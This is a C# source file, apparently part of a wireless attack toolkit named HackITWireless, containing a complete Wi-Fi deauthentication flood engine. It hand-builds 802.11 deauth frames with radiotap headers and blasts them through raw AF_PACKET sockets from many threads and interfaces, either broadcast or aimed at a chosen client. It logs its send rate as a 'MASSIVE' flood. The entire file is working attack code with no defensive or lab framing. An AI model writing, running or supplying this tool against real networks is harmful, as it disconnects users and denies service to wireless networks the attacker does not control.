using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace HackITWireless
{
    public class DeauthEngineV3
    {
        private readonly List<Slot> _slots = new List<Slot>();
        private readonly byte[] _bssid;
        private readonly byte[] _station;
        private readonly ushort _reason;
        private readonly bool _targeted;
        private volatile bool _running;
        private long _totalSent;
        private readonly int _threads;
        private CancellationTokenSource _cts;

        private static readonly byte[] Radiotap = {
            0x00, 0x00, 0x14, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };

        private class Slot
        {
            public string Iface;
            public int Fd = -1;
            public int Weight = 1;
        }

        public DeauthEngineV3(string bssid, string station = "FF:FF:FF:FF:FF:FF", ushort reason = 7, int threads = 4)
        {
            _bssid = ParseMac(bssid);
            _station = ParseMac(station);
            _reason = reason;
            _targeted = !station.Equals("FF:FF:FF:FF:FF:FF", StringComparison.OrdinalIgnoreCase);
            _threads = threads;
        }

        public long TotalSent => Interlocked.Read(ref _totalSent);
        public bool Running => _running;

        public void AddInterface(string iface, int weight = 1)
        {
            int fd = RawSocketOpen(iface);
            if (fd >= 0) _slots.Add(new Slot { Iface = iface, Fd = fd, Weight = weight });
        }

        public void Start()
        {
            if (_running) return;
            _running = true;
            _cts = new CancellationTokenSource();

            Console.Error.WriteLine($"[C#-v3] Deauth MASSIVE: {_slots.Count} ifaces x {_threads} threads");

            for (int i = 0; i < _slots.Count; i++)
            {
                for (int t = 0; t < _threads; t++)
                {
                    int idx = i;
                    Task.Run(() => Worker(_slots[idx], _cts.Token));
                }
            }

            Task.Run(() => MonitorLoop(_cts.Token));
        }

        public void Stop()
        {
            _running = false;
            _cts?.Cancel();
            foreach (var s in _slots) RawSocketClose(s.Fd);
            _slots.Clear();
        }

        private byte[] BuildFrame(byte[] bssid, byte[] station, ushort reason, uint seq)
        {
            byte[] mgmt = new byte[26];
            mgmt[0] = 0xC0; mgmt[1] = 0x00;
            mgmt[2] = 0x3A; mgmt[3] = 0x01;
            Buffer.BlockCopy(station, 0, mgmt, 4, 6);
            Buffer.BlockCopy(bssid, 0, mgmt, 10, 6);
            Buffer.BlockCopy(bssid, 0, mgmt, 16, 6);
            ushort encSeq = (ushort)((seq << 4) & 0xFFFF);
            mgmt[22] = (byte)(encSeq & 0xFF);
            mgmt[23] = (byte)((encSeq >> 8) & 0xFF);
            mgmt[24] = (byte)(reason & 0xFF);
            mgmt[25] = (byte)((reason >> 8) & 0xFF);

            byte[] frame = new byte[Radiotap.Length + mgmt.Length];
            Buffer.BlockCopy(Radiotap, 0, frame, 0, Radiotap.Length);
            long ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() * 1000L;
            Buffer.BlockCopy(BitConverter.GetBytes(ts), 0, frame, 8, 8);
            Buffer.BlockCopy(mgmt, 0, frame, Radiotap.Length, mgmt.Length);
            return frame;
        }

        private void Worker(Slot slot, CancellationToken ct)
        {
            uint seq = 0;
            int burst = 128 * slot.Weight;

            while (!ct.IsCancellationRequested && _running)
            {
                for (int i = 0; i < burst && !ct.IsCancellationRequested; i++)
                {
                    byte[] f = BuildFrame(_bssid, _station, _reason, seq++);
                    if (RawSocketSend(slot.Fd, f) > 0)
                        Interlocked.Increment(ref _totalSent);

                    if (_targeted)
                    {
                        byte[] fc = BuildFrame(_station, _bssid, _reason, seq++);
                        if (RawSocketSend(slot.Fd, fc) > 0)
                            Interlocked.Increment(ref _totalSent);
                    }
                }
            }
        }

        private void MonitorLoop(CancellationToken ct)
        {
            var sw = Stopwatch.StartNew();
            while (!ct.IsCancellationRequested && _running)
            {
                Thread.Sleep(1000);
                long total = Interlocked.Read(ref _totalSent);
                double secs = sw.Elapsed.TotalSeconds;
                Console.Error.WriteLine($"  [C#-v3] MASSIVE: {total} total ({total/secs:F0} pps)");
            }
        }

        private static int RawSocketOpen(string iface)
        {
            byte[] ifaceBytes = System.Text.Encoding.ASCII.GetBytes(iface + "\0");
            uint ifindex = if_nametoindex(ifaceBytes);
            if (ifindex == 0) return -1;
            int fd = socket(AF_PACKET, SOCK_RAW, (ETH_P_ALL << 8) | ETH_P_ALL);
            if (fd < 0) return -1;
            SockAddrLl addr = new SockAddrLl
            {
                sll_family = AF_PACKET, sll_protocol = (ushort)((ETH_P_ALL << 8) | ETH_P_ALL),
                sll_ifindex = (int)ifindex, sll_hatype = 0, sll_pkttype = 0, sll_halen = 0,
                sll_addr = new byte[8]
            };
            int r = bind(fd, ref addr, Marshal.SizeOf(addr));
            if (r < 0) { close(fd); return -1; }
            return fd;
        }
        private static int RawSocketSend(int fd, byte[] buf) => send(fd, buf, buf.Length, 0);
        private static void RawSocketClose(int fd) { if (fd >= 0) close(fd); }

        private static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            if (clean.Length != 12) throw new ArgumentException($"Invalid MAC: {mac}");
            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++) bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);
            return bytes;
        }

        private const int AF_PACKET = 17, SOCK_RAW = 3, ETH_P_ALL = 0x0003;

        [DllImport("libc", SetLastError = true)] private static extern int socket(int domain, int type, int protocol);
        [DllImport("libc", SetLastError = true)] private static extern int bind(int sockfd, ref SockAddrLl addr, int addrlen);
        [DllImport("libc", SetLastError = true)] private static extern int send(int sockfd, byte[] buf, int len, int flags);
        [DllImport("libc", SetLastError = true)] private static extern int close(int fd);
        [DllImport("libc", SetLastError = true)] private static extern uint if_nametoindex([In] byte[] ifname);

        private struct SockAddrLl
        {
            public ushort sll_family; public ushort sll_protocol; public int sll_ifindex;
            public ushort sll_hatype; public byte sll_pkttype; public byte sll_halen;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] sll_addr;
        }
    }
}
